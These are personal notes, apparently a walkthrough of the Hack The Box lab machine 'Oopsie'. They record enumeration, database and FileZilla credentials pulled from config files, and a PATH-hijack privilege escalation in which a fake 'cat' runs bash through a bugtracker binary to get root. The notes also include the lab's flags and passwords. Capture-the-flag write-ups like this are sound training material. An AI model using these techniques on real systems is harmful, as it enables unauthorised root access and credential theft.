# Oopsie (10.10.10.28) Sh
[[apache]]
[[oopsie (10.10.10.28)]]
[[filezilla]]

## Summary
### Users
| user     | pass          | host        | services         | groups            | soruce            |
| -------- | ------------- | ----------- | ---------------- | ----------------- | ----------------- |
| www-data |               | 10.10.10.46 | apache           | www-data          | php reverse shell |
| robert   | M3g4C0rpUs3r! | 10.10.10.28 | mysql, ssh       | robert, bugtacker | php reverse shell |
| ftpuser  | mc@F1l3ZilL4  | 10.10.10.28 | ftp (fileserver) |                   | sh                | 

### System Info
| System Attribute | Value                              |
| ---------------- | ---------------------------------- |
| OS Name          | Ubuntu 18.04.3 LTS (Bionic Beaver) |
| OS Version       | kernel 4.15.0-76-generic           |
| Archtechture     | x64                                |
| RAM              | 1993 MB                            |
| Host Type        | VMware Virtual Machine             |
| Nics             | ens160 (10.10.10.28)               | 
## Procedure
1. found webserver user
	```
	$ whoami
	www-data
	```
	![[Pasted image 20210817104600.png]]
2. got system info
	```
	$ lshw
	WARNING: you should run this program as super-user.
	oopsie
		description: Computer
		width: 64 bits
		capabilities: smp vsyscall32
	  *-core
		   description: Motherboard
		   physical id: 0
		 *-memory
			  description: System memory
			  physical id: 0
			  size: 1993MiB
		 *-cpu:0
			  product: AMD EPYC 7401P 24-Core Processor
			  vendor: Advanced Micro Devices [AMD]
			  physical id: 1
			  bus info: cpu@0
			  width: 64 bits
	...
	```
	![[Pasted image 20210817105623.png]]
	- Archtechture: `x64`
	- RAM: `1993 MB`
3. got kernerl version
	```
	$ uname -a
	Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
	```
	![[Pasted image 20210817105357.png]]
	- Kernel version: `4.15.0-76-generic`
4. got os version
	```
	$ cat /etc/os-release
	NAME="Ubuntu"
	VERSION="18.04.3 LTS (Bionic Beaver)"
	ID=ubuntu
	ID_LIKE=debian
	PRETTY_NAME="Ubuntu 18.04.3 LTS"
	VERSION_ID="18.04"
	HOME_URL="https://www.ubuntu.com/"
	SUPPORT_URL="https://help.ubuntu.com/"
	BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
	PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
	VERSION_CODENAME=bionic
	UBUNTU_CODENAME=bionic
	```
	![[Pasted image 20210817105509.png]]
	- OS Version: `Ubuntu 18.04.3 LTS (Bionic Beaver)`
5. Got nic info
	```
	$ ip addr show
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
		link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
		inet 127.0.0.1/8 scope host lo
		   valid_lft forever preferred_lft forever
		inet6 ::1/128 scope host
		   valid_lft forever preferred_lft forever
	2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
		link/ether 00:50:56:b9:5d:49 brd ff:ff:ff:ff:ff:ff
		inet 10.10.10.28/24 brd 10.10.10.255 scope global ens160
		   valid_lft forever preferred_lft forever
		inet6 dead:beef::250:56ff:feb9:5d49/64 scope global dynamic mngtmpaddr
		   valid_lft 86352sec preferred_lft 14352sec
		inet6 fe80::250:56ff:feb9:5d49/64 scope link
		   valid_lft forever preferred_lft forever
	```
	![[Pasted image 20210817105917.png]]
	- Nic: `ens160 (10.10.10.28)`
5. Found db credentials at /var/www/html/cdn-cgi/login/db.php
	```
	$ cd /var/www/html/cdn-cgi/login
	$ cat db.php
	<?php
	$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
	?>
	```
	![[Pasted image 20210817110228.png]]
	- user: `robert`
	- pass: `M3g4C0rpUs3r!`
	- db: `garage`
	- ip: `127.0.0.1 (10.10.10.28)`
6. Found user flag at /home/robert/user.txt
	```
	$ cd /home/robert
	$ cat user.txt
	f2c74ee8db7983851ab2a96a44eb7981
	```
	![[Pasted image 20210817111619.png]]
	- user flag: `f2c74ee8db7983851ab2a96a44eb7981`
7. Got groups robert and www-data are a part of
	```
	robert@oopsie:/var/www/html/cdn-cgi/login$ cat /etc/group | grep 'robert\|www-data'
	www-data:x:33:
	robert:x:1000:lxd
	bugtracker:x:1001:robert
	```
	![[Pasted image 20210817112632.png]]
	- robert's groups: `robert, bugtracker`
	- www-data's groups: `www-data`
8. Discovered bugtacker application uses local version of cat
	```
	robert@oopsie:/var/www/html/cdn-cgi/login$ strings /usr/bin/bugtracker | grep -B 4 -A 4 "Provide Bug ID"
	[]A\A]A^A_
	------------------
	: EV Bug Tracker :
	------------------
	Provide Bug ID:
	---------------
	cat /root/reports/
	;*3$"
	GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
	```
	![[Pasted image 20210817113146.png]]
	- This means we can create out own version of cat
9. Created a malicious 'cat' program which calls bash
	```
	export PATH=/tmp/twof:$PATH
	echo '/bin/bash' > /tmp/twof/cat
	chmod +x /tmp/twof/cat
	
	robert@oopsie:/tmp/twof$ bugtracker

	------------------
	: EV Bug Tracker :
	------------------

	Provide Bug ID: 1
	---------------

	root@oopsie:/tmp/twof#
	```
	![[Pasted image 20210817122921.png]]
	- Obtained root shell through bugtracker program
10. Found root flag at /root/root.txt
	```
	root@oopsie:/root# cd /root
	root@oopsie:/root# /bin/cat root.txt
	af13b0bee69f8a877c3faf667f7beacf
	```
	![[Pasted image 20210817123228.png]]
11. Found filezilla credentials for 10.10.10.46 at /root/.config/filezilla
	```
	root@oopsie:/root/.config/filezilla# cd /root/.config/filezilla/
	root@oopsie:/root/.config/filezilla# /bin/cat filezilla.xml
	<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
	<FileZilla3>
		<RecentServers>
			<Server>
				<Host>10.10.10.46</Host>
				<Port>21</Port>
				<Protocol>0</Protocol>
				<Type>0</Type>
				<User>ftpuser</User>
				<Pass>mc@F1l3ZilL4</Pass>
				<Logontype>1</Logontype>
				<TimezoneOffset>0</TimezoneOffset>
				<PasvMode>MODE_DEFAULT</PasvMode>
				<MaximumMultipleConnections>0</MaximumMultipleConnections>
				<EncodingType>Auto</EncodingType>
				<BypassProxy>0</BypassProxy>
			</Server>
		</RecentServers>
	</FileZilla3>
	```
	![[Pasted image 20210817124001.png]]
	- account for filezilla server at 10.10.10.46
		- user: `ftpuser`
		- pass: `mc@F1l3ZilL4`
		- host: `10.10.10.46`
12. Found backup.zip on ftp server at 10.10.10.46
	```
	ftp> open 10.10.10.46
	Connected to 10.10.10.46.
	220 (vsFTPd 3.0.3)
	Name (10.10.10.46:robert): ftpuser
	331 Please specify the password.
	Password:
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
	226 Directory send OK.
	ftp> pwd
	257 "/" is the current directory
	ftp> get backup.zip
	local: backup.zip remote: backup.zip
	200 PORT command successful. Consider using PASV.
	150 Opening BINARY mode data connection for backup.zip (2533 bytes).
	226 Transfer complete.
	2533 bytes received in 0.00 secs (43.1367 MB/s)
	```
	![[Pasted image 20210817125153.png]]
	- backup.zip seems to be encrypted